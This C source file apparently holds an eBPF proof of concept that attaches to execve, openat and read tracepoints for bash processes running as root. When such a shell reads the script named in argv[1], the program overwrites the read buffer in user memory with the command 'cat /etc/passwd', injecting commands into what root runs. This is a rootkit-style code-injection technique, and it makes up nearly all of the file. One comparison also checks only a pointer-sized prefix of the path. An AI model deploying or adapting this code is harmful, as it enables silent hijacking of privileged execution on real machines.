// #include <linux/bpf.h>
// #include <bpf/bpf_helpers.h>
// #include <bpf/bpf_tracing.h>
// #include <bpf/bpf_core_read.h>

// #include <stddef.h>
// #include <stdint.h>

// // for offsetof(struct pt_regs, ...)
// #include <linux/ptrace.h>   // asm/ptrace.h
// #include <asm/unistd_64.h>

// #include "vmlinux.h"

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>


#define MAX_BUF 128
#define MAX_ENTRIES 10240
#define TASK_COMM_LEN 16

char LICENSE[] SEC("license") = "GPL";


// Define a BPF map to store the filenames
// Key: PID (u32), Value: filename (char array)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_ENTRIES);
    __type(key, uint32_t);
    __type(value, char[MAX_BUF]);
} exec_argv1_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_ENTRIES);
    __type(key, uint32_t);
    __type(value, char[MAX_BUF]);
} openat_path_map SEC(".maps");

/* active_bufs map now stores both user buffer pointer and fd so the exit tracepoint
 * can find the buffer and check fd (original logic read rsi/rdi from pt_regs;
 * with tracepoints we stash this at enter time).
 */
struct buf_info {
    void *buf;
    int fd;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 10240);
    __type(key, uint32_t);    // pid
    __type(value, struct buf_info); // fd + user buffer pointer
} active_bufs SEC(".maps");

int is_bash_with_root(struct pt_regs *ctx)
{
    char comm[TASK_COMM_LEN];
    
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // check if bash
    if(__builtin_memcmp(comm, "bash", 4) == 0) {
        
        // Get the current user and group IDs
        unsigned long long uid_gid = bpf_get_current_uid_gid();
        
        // UID is in lower 32 bits
        uint32_t uid = (uint32_t)uid_gid;
        
        // bpf_printk("Bash found, COMM=> %s uid=> %u\n", comm, uid);
        
        // if bash is in root
        if(uid==0)
        {
            // bpf_printk("\nROOOOOOOOOT\n");
            bpf_printk("Bash found, COMM=> %s uid=> %u\n", comm, uid);
            return 1;
        }
    }
    return 0;
}

/* Updated Parse_Sysenter_Execve to accept filename_ptr and argv_ptr directly
 * (tracepoint/syscalls provides syscall arguments directly).
 */
int Parse_Sysenter_Execve(unsigned long filename_ptr, unsigned long argv_ptr)
{
    // 4) read filename string from userspace
    char fname[128];
    if (filename_ptr && bpf_probe_read_user_str(fname, sizeof(fname), (const void *)filename_ptr) > 0)
    {
        bpf_printk("execve filename: %s\n", fname);
    }

    // Directly take i=1 instead of unrolling
    unsigned long argp = 0;
    unsigned long user_ptr = argv_ptr + 1 * sizeof(unsigned long);
    if (argv_ptr == 0)
    {
        return 0;
    }
    if (bpf_probe_read_user(&argp, sizeof(argp), (void *)user_ptr) < 0)
    {
        return 0;
    }
    if (argp == 0)
    {
        return 0;
    }

    char argbuf[128];
    uint32_t pid;
    if (bpf_probe_read_user_str(argbuf, sizeof(argbuf), (const void *)argp) > 0)
    {

        bpf_printk("bash ____ argv[%d] = %s\n", 1, argbuf);
        
        pid = bpf_get_current_pid_tgid() >> 32;
        bpf_map_update_elem(&exec_argv1_map, &pid, &argbuf, BPF_ANY);

    }
    else 
    {
        return 0;
    }

    return 0;
}

/* =========== Tracepoints =========== */

/* execve enter: take file name and */
/* store in exec_filenames keyed by pid. */
SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_bash_with_root(ctx))
        return 0;

    unsigned long filename_ptr = 0;
    unsigned long argv_ptr = 0;

    /* tracepoint/sys_enter_execve: args[0]=filename, args[1]=argv, args[2]=envp */
    if (bpf_probe_read(&filename_ptr, sizeof(filename_ptr), &ctx->args[0]) < 0)
        return 0;
    if (bpf_probe_read(&argv_ptr, sizeof(argv_ptr), &ctx->args[1]) < 0)
        return 0;

    Parse_Sysenter_Execve(filename_ptr, argv_ptr);

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;
    char *val = bpf_map_lookup_elem(&exec_argv1_map, &pid);
    if (val)
        bpf_printk("from trace_execve==> PID %d, argv[1] from map: %s\n", pid, val);
    else
        bpf_printk("from trace_execve==> PID %d, argv[1] from map: (null)\n", pid);

    return 0;
}

SEC("tracepoint/syscalls/sys_enter_openat")
int tp_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_bash_with_root(ctx))
        return 0;

    /* openat args: args[0]=dirfd, args[1=pathname], args[2]=flags, ... */
    unsigned long pathname_ptr = 0;
    if (bpf_probe_read(&pathname_ptr, sizeof(pathname_ptr),
                       &ctx->args[1]) < 0)
    {
        return 0;
    }

    if (!pathname_ptr)
        return 0;

    char pathname[MAX_BUF];
    if (bpf_probe_read_user_str(pathname, sizeof(pathname), (const void *)pathname_ptr) <= 0)
        return 0;

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;

    // --- look up argv[1] for this PID ---
    char *argv1 = bpf_map_lookup_elem(&exec_argv1_map, &pid);
    if (!argv1)
        return 0;

    if (__builtin_memcmp(pathname, argv1, sizeof(argv1)) == 0) {
        bpf_printk("openat match: pathname=%s equals argv1=%s\n", pathname, argv1);
        bpf_map_update_elem(&openat_path_map, &pid, &pathname, BPF_ANY);
    }

    return 0;
}


// sys_enter: stash buffer pointer
SEC("tracepoint/syscalls/sys_enter_read")
int tp__sys_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_bash_with_root(ctx))
        return 0;

    /* tracepoint/sys_enter_read: args[0]=fd, args[1]=buf, args[2]=count */
    int fd = 0;
    void *buf_ptr = 0;
    unsigned long arg0 = 0;
    unsigned long arg1 = 0;

    if (bpf_probe_read(&arg0, sizeof(arg0), &ctx->args[0]) < 0)
        return 0;
    if (bpf_probe_read(&arg1, sizeof(arg1), &ctx->args[1]) < 0)
        return 0;

    fd = (int)arg0;
    buf_ptr = (void *)arg1;

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;

    char *pathname = bpf_map_lookup_elem(&openat_path_map, &pid);
    if (!pathname)
        return 0;

    bpf_printk("SYSENTER read trying to get buffer\n");

    struct buf_info bi = {};
    bi.buf = buf_ptr;
    bi.fd = fd;

    bpf_printk("SYSENTER read storing in map\n");

    bpf_map_update_elem(&active_bufs, &pid, &bi, BPF_ANY);
    return 0;
}


SEC("tracepoint/syscalls/sys_exit_read")
int tp_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_bash_with_root(ctx))
        return 0;

    /* tracepoint/sys_exit_read: ret is return value in ctx->ret (signed long) */
    long ret = ctx->ret;
    if (ret <= 0)
        return 0;  // nothing read

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;

    /* Look up the pathname we stored earlier for this PID */
    char *pathname = bpf_map_lookup_elem(&openat_path_map, &pid);
    if (!pathname)
        return 0;

    /* retrieve saved buffer and fd from enter handler */
    struct buf_info *user_buf_info = bpf_map_lookup_elem(&active_bufs, &pid);
    if (!user_buf_info)
        return 0;

    // /* only proceed if fd == 3 (same filter you had in sys_exit handler) */
    // if (user_buf_info->fd != 3)
    //     return 0;

    /* Try to write a patch into the user buffer (same as your logic) */
    const char patch[] = "cat /etc/passwd       ";
    /* write patch to saved user buffer pointer */
    bpf_probe_write_user(user_buf_info->buf, patch, sizeof(patch)-1);

    /* read data from user buffer using the buffer pointer that the enter handler saved.
     * Note: ctx on exit tracepoint doesn't provide the buffer pointer directly,
     * so we use the saved one.
     */
    char data[128];
    int copy = ret < sizeof(data) ? ret : sizeof(data)-1;
    if (bpf_probe_read_user(data, copy, (void *)user_buf_info->buf) < 0)
        return 0;
    data[copy] = 0;

    bpf_printk("read: pid=%d fd=%d path=%s data=%s ret=%d\n",
               pid, user_buf_info->fd, pathname, data, (int)ret);

    /* cleanup saved buffer entry if desired (optional) */
    bpf_map_delete_elem(&active_bufs, &pid);

    return 0;
}
